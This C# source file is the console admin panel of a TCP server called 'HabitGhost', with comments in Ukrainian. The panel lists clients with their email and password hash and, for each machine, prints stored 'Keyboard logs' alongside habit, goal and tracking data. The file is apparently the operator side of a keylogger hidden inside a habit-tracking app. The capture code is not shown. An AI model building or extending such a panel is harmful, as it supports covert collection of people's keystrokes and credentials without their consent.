using System.Text;

namespace TcpServer
{
    public class Program
    {
        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.Unicode;
            // Створюємо об'єкт TCP-сервера
            HabitGhostServer server = new HabitGhostServer();

            // Запускаємо сервер у окремому потоці, щоб він працював постійно у фоні
            Thread serverThread = new Thread(server.Start);
            serverThread.Start();

            // Чекаємо 2 секунди запуск сервера
            Thread.Sleep(2000);

            // Меню для адміністратора
            /**/
            while (true)
            {
                Console.WriteLine("\n|--------- Admin panel HabitGhost ---------|");
                Console.WriteLine("|------ 1. View the list of clients -------|");
                Console.WriteLine("|--- 2. View data for a specific client ---|");
                Console.WriteLine("|---------------- 0. Exit -----------------|\n");
                Console.Write("Оберіть опцію: ");

                string option = Console.ReadLine(); // Зчитуємо вибір користувача

                switch (option)
                {
                    case "1":
                        // Отримуємо всіх користувачів із БД
                        var clients = server.GetAllUsers();

                        if (clients.Count == 0)
                        {
                            Console.WriteLine("\n[!] There are no clients in the database..");
                        }
                        else
                        {
                            Console.WriteLine("\n[Clients]");
                            foreach (var c in clients)
                            {
                                // Виводимо дані про кожного користувача
                                Console.WriteLine($"MachineID: {c.Id}, Name: {c.Username}, Email: {c.Mail}, Password: {c.PasswordHash}");
                            }
                        }
                        break;

                    case "2":
                        // Запитуємо MachineID користувача
                        Console.Write("Enter the client's MachineID: ");
                        if (int.TryParse(Console.ReadLine(), out int machineID))
                        {
                            // Отримуємо всі дані:
                            int userId = server.GetUserIdByMachineId(machineID);
                            if (userId == -1)
                            {
                                Console.WriteLine("[!] User not found or an error occurred.");
                                return;
                            }

                            // Дані про логи
                            var logsData = server.GetLogsByMachineID(userId);

                            // Дані про звички
                            var habitsData = server.GetHabitsByUserId(userId);

                            // Дані про історію звичок
                            var trackingData = server.GetHabitTrackingBytes(userId);

                            // Дані про цілі
                            var goalsData = server.GetGoalsByUserId(userId);

                            if (goalsData == null && logsData == null && habitsData == null && trackingData == null)
                            {
                                Console.WriteLine("[!] No client with this ID was found or there is no data.");
                            }
                            else
                            {
                                Console.WriteLine("\n---- Full client details ----");

                                if (logsData != null)
                                {
                                    Console.WriteLine("\n[Keyboard logs]");
                                    Console.WriteLine(Encoding.UTF8.GetString(logsData));
                                }

                                if (habitsData != null)
                                {
                                    Console.WriteLine("\n[Habits]");
                                    Console.WriteLine(Encoding.UTF8.GetString(habitsData));
                                }

                                if (trackingData != null)
                                {
                                    Console.WriteLine("\n[Habit performance history]");
                                    Console.WriteLine(Encoding.UTF8.GetString(trackingData));
                                }

                                if (goalsData != null)
                                {
                                    Console.WriteLine("\n[Goals]");
                                    Console.WriteLine(Encoding.UTF8.GetString(goalsData));
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] Incorrect ID format.");
                        }
                        break;

                    case "0":
                        ServerLogger.Log("[!] Exit...");
                        return; // Завершення програми

                    default:
                        Console.WriteLine("[!] Wrong choice!");
                        break;
                }
            }

        }
    }
}
